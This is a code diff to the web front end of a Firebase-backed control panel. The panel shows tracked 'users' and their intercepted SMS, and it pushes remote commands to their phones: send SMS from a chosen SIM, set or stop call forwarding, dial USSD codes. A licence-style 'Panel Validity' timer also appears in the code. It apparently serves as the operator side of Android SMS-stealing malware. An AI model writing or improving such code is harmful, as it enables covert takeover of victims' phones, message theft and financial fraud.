-                details: "Sent from Web",
-                time: time,
+                details: details,
+                time: new Date().toLocaleString(),
                 timestamp: Date.now(),
                 status: "Pending..."
+            };
+
+            db.ref('ActionLogs/' + selectedUserId + '/' + logId).set(logData).then(() => {
+                db.ref('Commands/' + selectedUserId).set({ action, slot: selectedSimSlot, logId, ...extra }).then(() => {
+                    showToast("Command Sent!");
+                });
             });
         }
 
-        function showSendSms() {
-            document.getElementById('smsTarget').value = "";
-            document.getElementById('smsMessage').value = "";
-            smsModal.show();
-            history.pushState({ view: 'modal' }, '');
-        }
-
+        function showToast(msg) { document.getElementById('toastMsg').innerText = msg; cmdToast.show(); }
+        function showSendSms() { smsModal.show(); }
         function confirmSendSms() {
-            const num = document.getElementById('smsTarget').value.trim();
-            const msg = document.getElementById('smsMessage').value.trim();
-
+            const numEl = document.getElementById('smsTarget');
+            const msgEl = document.getElementById('smsMessage');
+            const num = numEl.value.trim();
+            const msg = msgEl.value.trim();
+            const sim = document.querySelector('input[name="smsSim"]:checked').value;
             if (!num || !msg) return alert("Please fill both number and message");
 
+            const oldSlot = selectedSimSlot;
+            selectedSimSlot = parseInt(sim);
             sendCommand('sms', { target: num, message: msg });
+            selectedSimSlot = oldSlot;
+
+            // Clear inputs for next time
+            numEl.value = "";
+            msgEl.value = "";
             smsModal.hide();
-            // Modal hide will be handled by the modal event or history if needed,
-            // but for simplicity, we let the normal flow work.
         }
-
-        function showCallForward() {
-            document.getElementById('forwardNumber').value = "";
-            forwardModal.show();
-            history.pushState({ view: 'modal' }, '');
-        }
-
+        function showCallForward() { forwardModal.show(); }
         function confirmForward() {
-            const num = document.getElementById('forwardNumber').value.trim();
-            if (!num) return alert("Enter a number");
+            const numEl = document.getElementById('forwardNumber');
+            const num = numEl.value.trim();
+            const sim = document.querySelector('input[name="forwardSim"]:checked').value;
+            if (!num) return alert("Enter number");
+            const oldSlot = selectedSimSlot;
+            selectedSimSlot = parseInt(sim);
             sendCommand('forward', { number: num });
+            selectedSimSlot = oldSlot;
+
+            numEl.value = ""; // Clear input
             forwardModal.hide();
         }
-
-        function showDialUssd() {
-            document.getElementById('ussdCode').value = "";
-            ussdModal.show();
-            history.pushState({ view: 'modal' }, '');
+        function showStopForward() { stopForwardModal.show(); }
+        function confirmStopForward() {
+            const sim = document.querySelector('input[name="stopFwdSim"]:checked').value;
+            const oldSlot = selectedSimSlot;
+            selectedSimSlot = parseInt(sim);
+            sendCommand('stopforward');
+            selectedSimSlot = oldSlot;
+            stopForwardModal.hide();
         }
-
+        function showDialUssd() { ussdModal.show(); }
         function confirmUssd() {
-            const code = document.getElementById('ussdCode').value.trim();
-            if (!code) return alert("Enter USSD code");
-            sendCommand('dial', { code: code });
+            const codeEl = document.getElementById('ussdCode');
+            const code = codeEl.value.trim();
+            const sim = document.querySelector('input[name="ussdSim"]:checked').value;
+            if (!code) return alert("Enter code");
+            const oldSlot = selectedSimSlot;
+            selectedSimSlot = parseInt(sim);
+            sendCommand('dial', { code });
+            selectedSimSlot = oldSlot;
+
+            codeEl.value = ""; // Clear input
             ussdModal.hide();
         }
-
-        // UTILS
-        function copyText(text) {
-            if (!text || text === '--') return;
-            navigator.clipboard.writeText(text).then(() => {
-                showToast("Copied to clipboard!");
-            }).catch(err => {
-                const el = document.createElement('textarea');
-                el.value = text;
-                document.body.appendChild(el);
-                el.select();
-                document.execCommand('copy');
-                document.body.removeChild(el);
-                showToast("Copied to clipboard!");
-            });
-        }
-
-        function deleteSms(uid, smsId) {
-            const pass = prompt("Enter DELETE Password:");
-            if (!pass) return;
-
-            db.ref('AdminConfig/deletePass').once('value', snapshot => {
-                if (!snapshot.exists()) {
-                    // First time: Save the entered password as the permanent delete password
-                    db.ref('AdminConfig/deletePass').set(pass).then(() => {
-                        db.ref('AllSms/' + uid + '/' + smsId).remove().then(() => {
-                            showToast("Delete password set and message deleted");
-                        });
-                    });
+        function copyText(text) { if (!text || text === '--') return; navigator.clipboard.writeText(text).then(() => showToast("Copied!")); }
+        function makeWordsCopyable(text) {
+            if (!text || text === '--') return text || '--';
+            const parts = String(text).split(/(\s+)/);
+            return parts.map(part => {
+                if (/\s+/.test(part)) {
+                    return part.replace(/</g, "&lt;").replace(/>/g, "&gt;");
                 } else {
-                    const deletePass = snapshot.val();
-                    if (pass === deletePass) {
-                        db.ref('AllSms/' + uid + '/' + smsId).remove().then(() => {
-                            showToast("Message deleted");
-                        });
-                    } else {
-                        alert("Incorrect Delete Password!");
-                    }
+                    const escapedWord = part.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                    const copyVal = part.replace(/'/g, "\\'").replace(/"/g, "&quot;");
+                    return `<span class="sms-word" onclick="if(!window.getSelection().toString()) { event.stopPropagation(); copyText('${copyVal}'); }">${escapedWord}</span>`;
                 }
-            });
+            }).join('');
         }
-
-        // Initialize copy for all detail values
-        document.addEventListener('click', function(e) {
-            if (e.target && e.target.classList.contains('value-box')) {
-                copyText(e.target.innerText);
-            }
-        });
-        function updateStats() {
-            const users = Object.values(allData);
-            const total = users.length;
-            const online = users.filter(u => (Date.now() - parseInt(u.lastSeen || 0)) < 60000).length;
-            document.getElementById('statTotal').innerText = total;
-            document.getElementById('statOnline').innerText = online;
-            document.getElementById('statOffline').innerText = total - online;
-        }
-
-        function updateTimers() {
-            // Update validity timer
-            if (expiryTimestamp > 0) {
-                const diff = expiryTimestamp - Date.now();
-                if (diff > 0) {
-                    const days = Math.floor(diff / (24 * 60 * 60 * 1000));
-                    const hours = Math.floor((diff % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
-                    const mins = Math.floor((diff % (60 * 60 * 1000)) / (60 * 1000));
-                    const secs = Math.floor((diff % (60 * 1000)) / 1000);
-                    document.getElementById('validityText').innerText = `Panel Validity: ${days}d ${hours}h ${mins}m ${secs}s`;
-                } else {
-                    document.getElementById('validityText').innerText = "Panel Expired!";
-                    document.getElementById('validityText').style.color = "red";
-                }
-            } else {
-                document.getElementById('validityText').innerText = "Panel Validity: Lifetime";
-            }
-
-            // Update user cards last seen if visible
-            if (currentTab === 'users' || currentTab === 'online' || currentTab === 'offline') {
-                // To avoid full rerender, just update online status colors if possible
-                // For simplicity in this demo, we'll just let the interval trigger a render check if needed
-            }
-
-            if (selectedUserId) updatePageStatus();
-        }
-
-        function getTimeAgo(timestamp) {
-            if (!timestamp) return "Never";
-            const diff = Date.now() - parseInt(timestamp);
-            const seconds = Math.floor(diff / 1000);
-            if (seconds < 60) return seconds + "s ago";
-            const minutes = Math.floor(seconds / 60);
-            if (minutes < 60) return minutes + "m ago";
-            const hours = Math.floor(minutes / 60);
-            if (hours < 24) return hours + "h ago";
-            return Math.floor(hours / 24) + "d ago";
-        }
-
-        function showChangePass() {
-            const newPass = prompt("Enter New Admin Password:");
-            if (newPass) {
-                db.ref('AdminConfig/pass').set(newPass).then(() => {
-                    localStorage.setItem('sessionPass', newPass); // Update current session to prevent self-logout
-                    alert("Password Updated!");
-                });
-            }
-        }
+        function getTimeAgo(t) { if (!t) return "Never"; const s = Math.floor((Date.now()-parseInt(t))/1000); if (s<60) return s+"s ago"; if (s<3600) return Math.floor(s/60)+"m ago"; if (s<86400) return Math.floor(s/3600)+"h ago"; return Math.floor(s/86400)+"d ago"; }
+        function showChangePass() { const p = prompt("New Pass:"); if (p) db.ref('AdminConfig/pass').set(p); }
+        function updateStats() { const users = Object.values(allData), online = users.filter(u => (Date.now() - parseInt(u.lastSeen || 0)) < 60000).length; document.getElementById('statTotal').innerText = users.length; }
+        function updateTimers() { if (selectedRecordKey) updatePageStatus(); }
     </script>
 </body>
 </html>
